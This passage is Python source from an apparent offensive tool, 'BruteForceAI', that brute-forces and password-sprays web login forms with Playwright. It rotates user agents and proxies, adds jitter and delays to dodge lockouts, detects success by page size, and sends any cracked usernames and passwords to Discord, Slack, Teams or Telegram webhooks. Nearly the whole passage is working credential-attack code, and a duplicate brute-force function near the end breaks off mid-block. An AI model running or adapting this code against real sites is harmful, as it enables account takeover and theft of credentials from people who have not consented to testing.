            cursor.execute('\n                SELECT login_username_selector, login_password_selector, login_submit_button_selector\n                FROM form_analysis\n                WHERE url = ? AND (\n                    login_username_selector IS NOT NULL OR \n                    login_password_selector IS NOT NULL OR \n                    login_submit_button_selector IS NOT NULL\n                )\n                ORDER BY timestamp DESC\n                LIMIT 1\n            ', (url,))
            partial_result = cursor.fetchone()
            conn.close()
            if partial_result:
                partial_selectors = {'login_username_selector': partial_result[0], 'login_password_selector': partial_result[1], 'login_submit_button_selector': partial_result[2]}
                working_count = sum((1 for v in partial_selectors.values() if v is not None))
                print(f'📋 Found partial selectors for {url}: {working_count}/3 working')
                return partial_selectors
            return None
        except Exception as e:
            print(f'❌ Error checking existing selectors: {e}')
            return None

    def _extract_working_selectors(self, selectors, validation_details):
        """
        Extract selectors that actually work from validation results
        """
        working_selectors = {}
        for field, selector in selectors.items():
            field_name = field.replace('login_', '').replace('_selector', '')
            detail = validation_details.get(field_name, '')
            if '✅' in detail:
                working_selectors[field] = selector
        return working_selectors if working_selectors else None

    def _extract_form_content(self, html_content):
        """
        Extract login-related content from HTML - inputs, buttons, and their context
        """
        try:
            import re
            relevant_content = []
            input_patterns = ['<input[^>]*type=["\\\'](?:text|email|password|submit)["\\\'][^>]*>', '<input[^>]*name=["\\\'](?:username|email|password|login|user)["\\\'][^>]*>', '<input[^>]*id=["\\\'](?:username|email|password|login|user|submit)["\\\'][^>]*>']
            for pattern in input_patterns:
                inputs = re.findall(pattern, html_content, re.IGNORECASE)
                relevant_content.extend(inputs)
            button_pattern = '<button[^>]*>.*?</button>'
            buttons = re.findall(button_pattern, html_content, re.DOTALL | re.IGNORECASE)
            relevant_content.extend(buttons)
            form_pattern = '<form[^>]*>.*?</form>'
            forms = re.findall(form_pattern, html_content, re.DOTALL | re.IGNORECASE)
            for form in forms:
                if any((keyword in form.lower() for keyword in ['password', 'login', 'username', 'email'])):
                    relevant_content.append(form)
            label_patterns = ['<label[^>]*>.*?(?:username|email|password|login).*?</label>', '<label[^>]*for=["\\\'](?:username|email|password|login|user)["\\\'][^>]*>.*?</label>']
            for pattern in label_patterns:
                labels = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
                relevant_content.extend(labels)
            seen = set()
            unique_content = []
            for item in relevant_content:
                if item not in seen:
                    seen.add(item)
                    unique_content.append(item)
            if unique_content:
                extracted_html = '\n'.join(unique_content)
                print(f'📋 Extracted {len(unique_content)} login-related elements ({len(extracted_html)} chars)')
                if len(extracted_html) > 15000:
                    extracted_html = extracted_html[:15000] + '...'
                return extracted_html
            else:
                print(f'⚠️  No login elements found, extracting all inputs/buttons')
                fallback_pattern = '<(?:input|button)[^>]*>(?:.*?</button>)?'
                fallback_elements = re.findall(fallback_pattern, html_content, re.DOTALL | re.IGNORECASE)
                if fallback_elements:
                    fallback_html = '\n'.join(fallback_elements)
                    if len(fallback_html) > 15000:
                        fallback_html = fallback_html[:15000] + '...'
                    return fallback_html
                else:
                    print(f'⚠️  No interactive elements found, using truncated HTML')
                    if len(html_content) > 20000:
                        return html_content[:20000] + '...'
                    return html_content
        except Exception as e:
            print(f'❌ Error extracting form content: {e}')
            if len(html_content) > 20000:
                return html_content[:20000] + '...'
            return html_content

    def stage2(self, mode='bruteforce', attack='playwright', threads=1):
        """
        Execute brute force attack using analyzed selectors from stage1
        
        Args:
            mode: 'bruteforce' or 'passwordspray' (default: 'bruteforce')
            attack: Attack method - only 'playwright' supported (default: 'playwright')
            threads: Number of threads to use (default: 1)
        """
        print(f'🚀 Stage 2: Starting {mode} attack')
        print(f'   Attack method: {attack}')
        print(f'   Threads: {threads}')
        print(f'   URLs: {len(self.urls)}')
        print(f'   Usernames: {len(self.usernames)}')
        print(f'   Passwords: {len(self.passwords)}')
        if attack != 'playwright':
            print('❌ Only playwright attack method is supported')
            return
        for url in self.urls:
            print(f'\n🎯 Processing URL: {url}')
            selectors_data = self._get_selectors_from_database(url)
            if not selectors_data:
                print(f'❌ No selectors found for {url} - run stage1 first')
                continue
            print(f'✅ Found selectors in database:')
            print(f'   Username: {selectors_data.get('login_username_selector')}')
            print(f'   Password: {selectors_data.get('login_password_selector')}')
            print(f'   Submit: {selectors_data.get('login_submit_button_selector')}')
            print(f'   Expected failed DOM length: {selectors_data.get('failed_dom_length')}')
            if mode == 'bruteforce':
                self._execute_bruteforce(url, selectors_data, threads)
            elif mode == 'passwordspray':
                self._execute_passwordspray(url, selectors_data, threads)
            else:
                print(f'❌ Unknown mode: {mode}')
                continue

    def _get_selectors_from_database(self, url):
        """
        Get selectors and analysis data from database for a URL
        
        Args:
            url: URL to get selectors for
            
        Returns:
            dict: Complete row data as JSON or None if not found
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('\n                SELECT * FROM form_analysis\n                WHERE url = ? AND success = 1\n                ORDER BY timestamp DESC\n                LIMIT 1\n            ', (url,))
            result = cursor.fetchone()
            if result:
                columns = [description[0] for description in cursor.description]
                row_dict = dict(zip(columns, result))
                conn.close()
                return row_dict
            cursor.execute('\n                SELECT * FROM form_analysis\n                WHERE url = ? AND (\n                    login_username_selector IS NOT NULL AND\n                    login_password_selector IS NOT NULL AND\n                    login_submit_button_selector IS NOT NULL\n                )\n                ORDER BY timestamp DESC\n                LIMIT 1\n            ', (url,))
            result = cursor.fetchone()
            if result:
                columns = [description[0] for description in cursor.description]
                row_dict = dict(zip(columns, result))
                print(f'⚠️  Using incomplete analysis (success=False) for {url}')
                conn.close()
                return row_dict
            conn.close()
            return None
        except Exception as e:
            print(f'❌ Error getting selectors from database: {e}')
            return None

    def _execute_bruteforce(self, url, selectors_data, threads):
        """
        Execute brute force attack (try all username/password combinations)
        """
        print(f'🔥 Executing brute force attack on {url}')
        combinations = []
        for username in self.usernames:
            for password in self.passwords:
                combinations.append((username, password))
        print(f'📊 Total combinations: {len(combinations)}')
        if not self.force_retry:
            print(f'🔍 Checking for existing attempts...')
            original_count = len(combinations)
            combinations = [(u, p) for u, p in combinations if not self._attempt_exists(url, u, p)]
            skipped_count = original_count - len(combinations)
            if skipped_count > 0:
                print(f'⏭️  Skipped {skipped_count} existing attempts')
            print(f'📊 Remaining combinations: {len(combinations)}')
            if len(combinations) == 0:
                print(f'✅ All combinations already attempted for {url}')
                return
        else:
            print(f'🔄 Force retry enabled - will retry existing attempts')
        if self.delay > 0:
            print(f'⏱️  Delay between passwords for same user: {self.delay}s')
        if self.jitter > 0:
            print(f'🎲 Random jitter: 0-{self.jitter}s')
        if self.success_exit:
            print(f'🚪 Success exit: Will stop after first successful login')
        if threads == 1:
            current_username = None
            for i, (username, password) in enumerate(combinations, 1):
                if (self.delay > 0 or self.jitter > 0) and current_username == username and (i > 1):
                    actual_delay = self._calculate_delay_with_jitter()
                    if self.verbose:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'⏳ [{timestamp}] Waiting {actual_delay:.2f}s before next password for {username}...')
                    else:
                        print(f'⏳ Waiting {actual_delay:.2f}s before next password for {username}...')
                    time.sleep(actual_delay)
                current_username = username
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'🔑 [{timestamp}] [{i}/{len(combinations)}] Trying: {username}:{password}')
                else:
                    print(f'🔑 [{i}/{len(combinations)}] Trying: {username}:{password}')
                success = self._attempt_login(url, selectors_data, username, password)
                if success:
                    if self.verbose:
                        success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                    else:
                        print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    if self._has_webhooks_configured():
                        print(f'🔔 Sending success notifications...')
                    self._send_success_notification(url, username, password, timestamp)
                    if self.success_exit:
                        print(f'🚪 Success exit enabled - stopping attack for {url}')
                        return
        else:
            print(f'🧵 Using {threads} threads for brute force')
            if self.delay > 0:
                print(f'✅ Delay synchronization enabled - proper delays between passwords for same user')
            success_found = threading.Event() if self.success_exit else None
            username_last_attempt = {}
            username_locks = {}
            for username in self.usernames:
                username_locks[username] = threading.Lock()
                username_last_attempt[username] = 0
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_creds = {executor.submit(self._attempt_login_with_delay_sync, url, selectors_data, username, password, combinations, success_found, username_last_attempt, username_locks): (username, password) for username, password in combinations}
                completed = 0
                for future in as_completed(future_to_creds):
                    username, password = future_to_creds[future]
                    completed += 1
                    try:
                        success = future.result()
                        if self.verbose:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            status = 'SUCCESS' if success else 'FAILED'
                            print(f'🔑 [{timestamp}] [{completed}/{len(combinations)}] Tried: {username}:{password} - {status}')
                        else:
                            print(f'🔑 [{completed}/{len(combinations)}] Tried: {username}:{password} - {('SUCCESS' if success else 'FAILED')}')
                        if success:
                            if self.verbose:
                                success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                            else:
                                print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            if self._has_webhooks_configured():
                                print(f'🔔 Sending success notifications...')
                            self._send_success_notification(url, username, password, timestamp)
                            if self.success_exit:
                                print(f'🚪 Success exit enabled - signaling other threads to stop')
                                success_found.set()
                                for remaining_future in future_to_creds:
                                    if not remaining_future.done():
                                        remaining_future.cancel()
                                return
                    except Exception as e:
                        if self.verbose:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            print(f'❌ [{timestamp}] Error testing {username}:{password} - {e}')
                        else:
                            print(f'❌ Error testing {username}:{password} - {e}')

    def _execute_passwordspray(self, url, selectors_data, threads):
        """
        Execute password spray attack (try each password against all usernames)
        """
        print(f'💦 Executing password spray attack on {url}')
        if self.delay > 0:
            print(f'⏱️  Delay between passwords: {self.delay}s')
        if self.jitter > 0:
            print(f'🎲 Random jitter: 0-{self.jitter}s')
        if self.success_exit:
            print(f'🚪 Success exit: Will stop after first successful login')
        for i, password in enumerate(self.passwords, 1):
            if self.verbose:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f'\n🔑 [{timestamp}] [{i}/{len(self.passwords)}] Testing password: {password}')
            else:
                print(f'\n🔑 [{i}/{len(self.passwords)}] Testing password: {password}')
            current_usernames = self.usernames
            if not self.force_retry:
                original_count = len(current_usernames)
                current_usernames = [u for u in current_usernames if not self._attempt_exists(url, u, password)]
                skipped_count = original_count - len(current_usernames)
                if skipped_count > 0:
                    print(f'   ⏭️  Skipped {skipped_count} existing attempts for password: {password}')
                if len(current_usernames) == 0:
                    print(f'   ✅ All usernames already attempted for password: {password}')
                    continue
            if threads == 1:
                for j, username in enumerate(current_usernames, 1):
                    if self.verbose:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        print(f'   👤 [{timestamp}] [{j}/{len(current_usernames)}] Trying: {username}:{password}')
                    else:
                        print(f'   👤 [{j}/{len(current_usernames)}] Trying: {username}:{password}')
                    success = self._attempt_login(url, selectors_data, username, password)
                    if success:
                        if self.verbose:
                            success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                        else:
                            print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        if self._has_webhooks_configured():
                            print(f'🔔 Sending success notifications...')
                        self._send_success_notification(url, username, password, timestamp)
                        if self.success_exit:
                            print(f'🚪 Success exit enabled - stopping attack for {url}')
                            return
            else:
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'🧵 [{timestamp}] Using {threads} threads for password: {password}')
                else:
                    print(f'🧵 Using {threads} threads for password: {password}')
                success_found = threading.Event() if self.success_exit else None
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    future_to_username = {executor.submit(self._attempt_login_with_success_check, url, selectors_data, username, password, success_found): username for username in current_usernames}
                    completed = 0
                    password_success = False
                    for future in as_completed(future_to_username):
                        username = future_to_username[future]
                        completed += 1
                        try:
                            success = future.result()
                            if self.verbose:
                                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                status = 'SUCCESS' if success else 'FAILED'
                                print(f'   👤 [{timestamp}] [{completed}/{len(current_usernames)}] Tried: {username}:{password} - {status}')
                            else:
                                print(f'   👤 [{completed}/{len(current_usernames)}] Tried: {username}:{password} - {('SUCCESS' if success else 'FAILED')}')
                            if success:
                                if self.verbose:
                                    success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                    print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                                else:
                                    print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                if self._has_webhooks_configured():
                                    print(f'🔔 Sending success notifications...')
                                self._send_success_notification(url, username, password, timestamp)
                                if self.success_exit:
                                    print(f'🚪 Success exit enabled - stopping attack for {url}')
                                    password_success = True
                                    success_found.set()
                                    for remaining_future in future_to_username:
                                        if not remaining_future.done():
                                            remaining_future.cancel()
                                    break
                        except Exception as e:
                            if self.verbose:
                                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                                print(f'❌ [{timestamp}] Error testing {username}:{password} - {e}')
                            else:
                                print(f'❌ Error testing {username}:{password} - {e}')
                if password_success and self.success_exit:
                    return
            if i < len(self.passwords) and (self.delay > 0 or self.jitter > 0):
                actual_delay = self._calculate_delay_with_jitter()
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'⏳ [{timestamp}] Waiting {actual_delay:.2f}s before next password...')
                else:
                    print(f'⏳ Waiting {actual_delay:.2f}s before next password...')
                time.sleep(actual_delay)
            elif i < len(self.passwords):
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'⏳ [{timestamp}] Waiting 1s before next password...')
                else:
                    print(f'⏳ Waiting 1s before next password...')
                time.sleep(1)

    def _attempt_login_with_success_check(self, url, selectors_data, username, password, success_found):
        """
        Attempt login with success check for multi-threaded password spray
        """
        if success_found and success_found.is_set():
            return False
        return self._attempt_login(url, selectors_data, username, password)

    def _attempt_login_with_delay_sync(self, url, selectors_data, username, password, all_combinations, success_found, username_last_attempt, username_locks):
        """
        Attempt login with synchronized delay logic for multi-threaded brute force
        This ensures proper delay between passwords for the same user across threads
        """
        if success_found and success_found.is_set():
            return False
        if (self.delay > 0 or self.jitter > 0) and username in username_locks:
            with username_locks[username]:
                current_time = time.time()
                last_attempt_time = username_last_attempt.get(username, 0)
                if last_attempt_time > 0:
                    time_since_last = current_time - last_attempt_time
                    required_delay = self._calculate_delay_with_jitter()
                    if time_since_last < required_delay:
                        wait_time = required_delay - time_since_last
                        if self.verbose:
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            print(f'⏳ [{timestamp}] Thread waiting {wait_time:.2f}s for username {username}...')
                        time.sleep(wait_time)
                username_last_attempt[username] = time.time()
        if success_found and success_found.is_set():
            return False
        return self._attempt_login(url, selectors_data, username, password)

    def _attempt_login_with_delay(self, url, selectors_data, username, password, all_combinations, success_found):
        """
        Attempt login with delay logic for multi-threaded brute force
        This tries to implement delay between passwords for the same user in multi-threaded mode
        """
        if success_found and success_found.is_set():
            return False
        if self.delay > 0 or self.jitter > 0:
            try:
                current_index = all_combinations.index((username, password))
                if current_index > 0:
                    prev_username, prev_password = all_combinations[current_index - 1]
                    if prev_username == username:
                        actual_delay = self._calculate_delay_with_jitter()
                        time.sleep(actual_delay)
            except ValueError:
                pass
        if success_found and success_found.is_set():
            return False
        return self._attempt_login(url, selectors_data, username, password)

    def _attempt_login(self, url, selectors_data, username, password):
        """
        Attempt login with given credentials and detect success/failure
        
        Args:
            url: Target URL
            selectors_data: Selectors and analysis data from database
            username: Username to try
            password: Password to try
            
        Returns:
            bool: True if login successful, False if failed
        """
        max_retries = self.retry_attempts
        retry_delay = 2
        for attempt in range(max_retries):
            start_time = time.time()
            try:
                with sync_playwright() as p:
                    browser_args = {'headless': not self.show_browser, 'slow_mo': 100 if self.show_browser else 0}
                    browser = p.chromium.launch(**browser_args)
                    context_args = {}
                    if self.proxy:
                        context_args['proxy'] = {'server': self.proxy}
                    random_user_agent = self._get_random_user_agent()
                    if random_user_agent:
                        context_args['user_agent'] = random_user_agent
                    context = browser.new_context(**context_args)
                    page = context.new_page()
                    page.goto(url, timeout=30000)
                    page.wait_for_load_state('networkidle')
                    username_selector = selectors_data.get('login_username_selector')
                    if username_selector:
                        page.locator(username_selector).first.clear()
                        page.locator(username_selector).first.fill(username)
                    password_selector = selectors_data.get('login_password_selector')
                    if password_selector:
                        page.locator(password_selector).first.clear()
                        page.locator(password_selector).first.fill(password)
                    submit_selector = selectors_data.get('login_submit_button_selector')
                    if submit_selector:
                        page.locator(submit_selector).first.click()
                    try:
                        page.wait_for_load_state('networkidle', timeout=5000)
                    except:
                        time.sleep(2)
                    if self.show_browser and self.browser_wait > 0:
                        time.sleep(self.browser_wait)
                    try:
                        if username_selector:
                            page.locator(username_selector).first.clear()
                        if password_selector:
                            page.locator(password_selector).first.clear()
                    except:
                        pass
                    current_html = page.content()
                    current_dom_length = len(current_html)
                    expected_failed_dom_length = selectors_data.get('failed_dom_length')
                    success = False
                    if expected_failed_dom_length:
                        expected_failed_dom_length = int(expected_failed_dom_length)
                        dom_diff = abs(current_dom_length - expected_failed_dom_length)
                        if dom_diff < self.dom_threshold:
                            success = False
                            if self.debug:
                                print(f'   🔍 DEBUG - DOM close to failed length (diff: {dom_diff} < {self.dom_threshold}) - LOGIN FAILED')
                        else:
                            success = True
                            if self.debug:
                                print(f'   🔍 DEBUG - DOM differs significantly from failed length (diff: {dom_diff} >= {self.dom_threshold}) - LOGIN SUCCESS')
                    else:
                        print(f'   ⚠️  No reference failed DOM length - using heuristics')
                        page_text = page.content().lower()
                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'account', 'home']
                        failure_indicators = ['error', 'invalid', 'incorrect', 'failed', 'wrong', 'denied']
                        success_score = sum((1 for indicator in success_indicators if indicator in page_text))
                        failure_score = sum((1 for indicator in failure_indicators if indicator in page_text))
                        if success_score > failure_score:
                            success = True
                        else:
                            success = False
                        if self.debug:
                            print(f'   🔍 DEBUG - Heuristic scores: success={success_score}, failure={failure_score}')
                    response_time_ms = int((time.time() - start_time) * 1000)
                    external_ip = self.external_ip
                    self._save_brute_force_attempt({'url': url, 'username_or_email': username, 'password': password, 'dom_length': str(current_dom_length), 'failed_dom_length': str(expected_failed_dom_length) if expected_failed_dom_length else None, 'success': success, 'response_time_ms': response_time_ms, 'playwright_or_requests': 'playwright', 'proxy_server': self.proxy, 'external_ip': external_ip})
                    browser.close()
                    return success
            except Exception as e:
                error_msg = str(e)
                network_errors = ['ERR_CONNECTION_REFUSED', 'ERR_NETWORK_CHANGED', 'ERR_INTERNET_DISCONNECTED', 'ERR_CONNECTION_TIMED_OUT', 'ERR_CONNECTION_RESET', 'net::ERR_', 'TimeoutError', 'Connection refused', 'Connection timed out']
                is_network_error = any((error in error_msg for error in network_errors))
                if is_network_error and attempt < max_retries - 1:
                    print(f'   🔄 Network error (attempt {attempt + 1}/{max_retries}): {error_msg[:100]}')
                    print(f'   ⏳ Retrying in {retry_delay} seconds...')
                    time.sleep(retry_delay)
                    continue
                else:
                    if is_network_error:
                        print(f'   ❌ Network error after {max_retries} attempts: {error_msg[:100]}')
                    else:
                        print(f'   ❌ Error during login attempt: {error_msg[:100]}')
                    response_time_ms = int((time.time() - start_time) * 1000)
                    external_ip = self.external_ip
                    self._save_brute_force_attempt({'url': url, 'username_or_email': username, 'password': password, 'dom_length': None, 'failed_dom_length': selectors_data.get('failed_dom_length'), 'success': False, 'response_time_ms': response_time_ms, 'playwright_or_requests': 'playwright', 'proxy_server': self.proxy, 'external_ip': external_ip})
                    return False
        return False

    def _save_brute_force_attempt(self, attempt_data):
        """
        Save brute force attempt to database
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('\n                INSERT INTO brute_force_attempts \n                (url, username_or_email, password, dom_length, failed_dom_length,\n                 success, response_time_ms, playwright_or_requests, proxy_server, external_ip)\n                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n            ', (attempt_data['url'], attempt_data['username_or_email'], attempt_data['password'], attempt_data['dom_length'], attempt_data['failed_dom_length'], attempt_data['success'], attempt_data['response_time_ms'], attempt_data['playwright_or_requests'], attempt_data['proxy_server'], attempt_data['external_ip']))
            conn.commit()
            conn.close()
        except Exception as e:
            if self.debug:
                print(f'❌ Error saving brute force attempt: {e}')

    def _get_external_ip(self):
        """
        Get external IP address (can be slow - up to 5 seconds)
        """
        try:
            response = requests.get('https://api.ipify.org', timeout=2)
            return response.text.strip()
        except:
            return None

    def _get_random_user_agent(self):
        """
        Get a random User-Agent string from the loaded list
        
        Returns:
            str: Random User-Agent string or None if no User-Agents loaded
        """
        if self.user_agents:
            user_agent = random.choice(self.user_agents)
            if self.debug:
                print(f'🎭 Selected User-Agent: {user_agent[:50]}...')
            return user_agent
        return None

    def _attempt_exists(self, url, username, password):
        """
        Check if an attempt already exists in the database
        
        Args:
            url: Target URL
            username: Username to check
            password: Password to check
            
        Returns:
            bool: True if attempt exists, False otherwise
        """
        try:
            conn = sqlite3.connect(self.database)
            cursor = conn.cursor()
            cursor.execute('\n                SELECT COUNT(*) FROM brute_force_attempts\n                WHERE url = ? AND username_or_email = ? AND password = ?\n            ', (url, username, password))
            count = cursor.fetchone()[0]
            conn.close()
            return count > 0
        except Exception as e:
            if self.debug:
                print(f'❌ Error checking existing attempt: {e}')
            return False

    def _print_webhook_config(self):
        """Print webhook configuration status"""
        webhooks_configured = []
        if self.discord_webhook:
            webhooks_configured.append('Discord')
        if self.slack_webhook:
            webhooks_configured.append('Slack')
        if self.teams_webhook:
            webhooks_configured.append('Teams')
        if self.telegram_webhook and self.telegram_chat_id:
            webhooks_configured.append('Telegram')
        if webhooks_configured:
            print(f'🔔 Webhook notifications enabled: {', '.join(webhooks_configured)}')
        elif self.debug:
            print('🔕 No webhook notifications configured')

    def _send_success_notification(self, url, username, password, timestamp=None):
        """
        Send success notification to configured webhooks
        
        Args:
            url: Target URL where success occurred
            username: Successful username
            password: Successful password
            timestamp: Optional timestamp (defaults to current time)
        """
        if not timestamp:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message_title = '🎉 BruteForceAI Success!'
        message_body = f'\n**Target:** {url}\n**Username:** {username}\n**Password:** {password}\n**Time:** {timestamp}\n**External IP:** {self.external_ip or 'Unknown'}\n'
        if self.discord_webhook:
            self._send_discord_notification(message_title, message_body, url, username, password, timestamp)
        if self.slack_webhook:
            self._send_slack_notification(message_title, message_body, url, username, password, timestamp)
        if self.teams_webhook:
            self._send_teams_notification(message_title, message_body, url, username, password, timestamp)
        if self.telegram_webhook and self.telegram_chat_id:
            self._send_telegram_notification(message_title, message_body, url, username, password, timestamp)

    def _send_discord_notification(self, title, body, url, username, password, timestamp):
        """Send notification to Discord webhook"""
        try:
            payload = {'embeds': [{'title': title, 'description': body, 'color': 65280, 'fields': [{'name': '🎯 Target', 'value': url, 'inline': False}, {'name': '👤 Username', 'value': f'`{username}`', 'inline': True}, {'name': '🔑 Password', 'value': f'`{password}`', 'inline': True}, {'name': '🕐 Time', 'value': timestamp, 'inline': True}, {'name': '🌐 External IP', 'value': self.external_ip or 'Unknown', 'inline': True}], 'footer': {'text': 'BruteForceAI by Mor David'}, 'timestamp': datetime.now().isoformat()}]}
            response = requests.post(self.discord_webhook, json=payload, timeout=10)
            if response.status_code == 204:
                if self.debug:
                    print('✅ Discord notification sent successfully')
            else:
                print(f'⚠️  Discord notification failed: {response.status_code}')
        except Exception as e:
            print(f'❌ Discord notification error: {e}')

    def _send_slack_notification(self, title, body, url, username, password, timestamp):
        """Send notification to Slack webhook"""
        try:
            payload = {'text': title, 'attachments': [{'color': 'good', 'fields': [{'title': '🎯 Target', 'value': url, 'short': False}, {'title': '👤 Username', 'value': username, 'short': True}, {'title': '🔑 Password', 'value': password, 'short': True}, {'title': '🕐 Time', 'value': timestamp, 'short': True}, {'title': '🌐 External IP', 'value': self.external_ip or 'Unknown', 'short': True}], 'footer': 'BruteForceAI by Mor David', 'ts': int(datetime.now().timestamp())}]}
            response = requests.post(self.slack_webhook, json=payload, timeout=10)
            if response.status_code == 200:
                if self.debug:
                    print('✅ Slack notification sent successfully')
            else:
                print(f'⚠️  Slack notification failed: {response.status_code}')
        except Exception as e:
            print(f'❌ Slack notification error: {e}')

    def _send_teams_notification(self, title, body, url, username, password, timestamp):
        """Send notification to Microsoft Teams webhook"""
        try:
            payload = {'@type': 'MessageCard', '@context': 'http://schema.org/extensions', 'themeColor': '00FF00', 'summary': title, 'sections': [{'activityTitle': title, 'activitySubtitle': 'Login credentials discovered', 'facts': [{'name': '🎯 Target', 'value': url}, {'name': '👤 Username', 'value': username}, {'name': '🔑 Password', 'value': password}, {'name': '🕐 Time', 'value': timestamp}, {'name': '🌐 External IP', 'value': self.external_ip or 'Unknown'}], 'markdown': True}]}
            response = requests.post(self.teams_webhook, json=payload, timeout=10)
            if response.status_code == 200:
                if self.debug:
                    print('✅ Teams notification sent successfully')
            else:
                print(f'⚠️  Teams notification failed: {response.status_code}')
        except Exception as e:
            print(f'❌ Teams notification error: {e}')

    def _send_telegram_notification(self, title, body, url, username, password, timestamp):
        """Send notification to Telegram bot"""
        try:
            message = f'🎉 *BruteForceAI Success\\!*\n\n🎯 *Target:* `{url}`\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`\n🕐 *Time:* {timestamp}\n🌐 *External IP:* {self.external_ip or 'Unknown'}\n\n_BruteForceAI by Mor David_'
            telegram_url = f'https://api.telegram.org/bot{self.telegram_webhook}/sendMessage'
            payload = {'chat_id': self.telegram_chat_id, 'text': message, 'parse_mode': 'MarkdownV2'}
            response = requests.post(telegram_url, json=payload, timeout=10)
            if response.status_code == 200:
                if self.debug:
                    print('✅ Telegram notification sent successfully')
            else:
                print(f'⚠️  Telegram notification failed: {response.status_code}')
                if self.debug:
                    print(f'Response: {response.text}')
        except Exception as e:
            print(f'❌ Telegram notification error: {e}')

    def _has_webhooks_configured(self):
        """
        Check if any webhooks are configured
        
        Returns:
            bool: True if at least one webhook is configured, False otherwise
        """
        return any([self.discord_webhook, self.slack_webhook, self.teams_webhook, self.telegram_webhook])

def _execute_bruteforce(self, url, selectors_data, threads):
    """
        Execute brute force attack (try all username/password combinations)
        """
    print(f'🔥 Executing brute force attack on {url}')
    combinations = []
    for username in self.usernames:
        for password in self.passwords:
            combinations.append((username, password))
    print(f'📊 Total combinations: {len(combinations)}')
    if not self.force_retry:
        print(f'🔍 Checking for existing attempts...')
        original_count = len(combinations)
        combinations = [(u, p) for u, p in combinations if not self._attempt_exists(url, u, p)]
        skipped_count = original_count - len(combinations)
        if skipped_count > 0:
            print(f'⏭️  Skipped {skipped_count} existing attempts')
        print(f'📊 Remaining combinations: {len(combinations)}')
        if len(combinations) == 0:
            print(f'✅ All combinations already attempted for {url}')
            return
    else:
        print(f'🔄 Force retry enabled - will retry existing attempts')
    if self.delay > 0:
        print(f'⏱️  Delay between passwords for same user: {self.delay}s')
    if self.jitter > 0:
        print(f'🎲 Random jitter: 0-{self.jitter}s')
    if self.success_exit:
        print(f'🚪 Success exit: Will stop after first successful login')
    if threads == 1:
        current_username = None
        for i, (username, password) in enumerate(combinations, 1):
            if (self.delay > 0 or self.jitter > 0) and current_username == username and (i > 1):
                actual_delay = self._calculate_delay_with_jitter()
                if self.verbose:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'⏳ [{timestamp}] Waiting {actual_delay:.2f}s before next password for {username}...')
                else:
                    print(f'⏳ Waiting {actual_delay:.2f}s before next password for {username}...')
                time.sleep(actual_delay)
            current_username = username
            if self.verbose:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                print(f'🔑 [{timestamp}] [{i}/{len(combinations)}] Trying: {username}:{password}')
            else:
                print(f'🔑 [{i}/{len(combinations)}] Trying: {username}:{password}')
            success = self._attempt_login(url, selectors_data, username, password)
            if success:
                if self.verbose:
                    success_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    print(f'🎉 [{success_timestamp}] SUCCESS! Valid credentials found: {username}:{password}')
                else:
                    print(f'🎉 SUCCESS! Valid credentials found: {username}:{password}')
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                if self._has_webhooks_configured():
                    print(f'🔔 Sending success notifications...')
                self._send_success_notification(url, username, password, timestamp)
                if self.success_exit:
                    print(f'🚪 Success exit enabled - stopping attack for {url}')
                    return
    else:
        print(f'🧵 Using {threads} threads for brute force')
        if self.delay > 0:
            print(f'✅ Delay synchronization enabled - proper delays between passwords for same user')
        success_found = threading.Event() if self.success_exit else None
        username_last_attempt = {}
        username_locks = {}
        for username in self.usernames:
            username_locks[username] = threading.Lock()
            username_last_attempt[username] = 0
        with ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_creds = {executor.submit(self._attempt_login_with_delay_sync, url, selectors_data, username, password, combinations, success_found, username_last_attempt, username_locks): (username, password) for username, password in combinations}
            completed = 0
            for future in as_completed(future_to_creds):
                username, password = future_to_creds[future]
                completed += 1
                try:
